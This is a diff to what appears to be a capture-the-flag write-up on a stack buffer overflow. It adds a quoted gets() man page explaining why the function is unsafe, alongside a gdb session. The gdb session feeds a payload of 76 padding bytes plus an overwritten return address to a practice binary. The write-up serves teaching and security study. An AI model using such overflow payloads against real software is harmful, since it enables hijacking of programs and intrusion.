@@ -133,7 +133,23 @@ Dump of assembler code for function vuln:
    0x0804869c &lt;+61&gt;:    leave  
    0x0804869d &lt;+62&gt;:    ret    
 End of assembler dump.
-</code></pre><p>We know the <code>call 0x8048430 &lt;gets@plt></code> is where the assembly code gets user input so lets view the important bits of the stack change as we step through it after setting a breakpoint right before it.<pre><code class=language-bash>(gdb) b* 0x08048678
+</code></pre><p>We know the <code>call 0x8048430 &lt;gets@plt></code> is where the assembly code gets user input so lets view the important bits of the stack change as we step through it after setting a breakpoint right before it.<p>How do we know <code>gets()</code> is the function that's vulnerable? Well try running <code>man gets</code>. Here's an excerpt:<pre><code>GETS(3)    Linux Programmer's Manual    GETS(3)
+
+NAME
+  gets - get a string from standard input (DEPRECATED)
+
+SYNOPSIS
+  #include &lt;stdio.h&gt;
+
+  char *gets(char *s);
+
+DESCRIPTION
+  Never use this function.
+  gets() reads a line from stdin into the buffer pointed to by s until either a terminating newline or EOF, which replaces with a null byte ('\0'). No check for buffer overrun is performed (see BUGS below).
+
+RETURN VALUE
+  gets() returns s on success, and NULL on error or when end of file occurs while no characters have been read. However, given the lack of buffer overrun checking, there can be no guarantees that the function will even return.
+</code></pre><pre><code class=language-bash>(gdb) b* 0x08048678
 Breakpoint 1 at 0x8048678
 (gdb) r &lt; &lt;(python -c 'print(&quot;A&quot;*76+&quot;\xe6\x85\x04\x08&quot;)')
 Starting program: /problems/overflow-1/vuln &lt; &lt;(python -c 'print(&quot;A&quot;*76+&quot;\xe6\x85\x04\x08&quot;)')
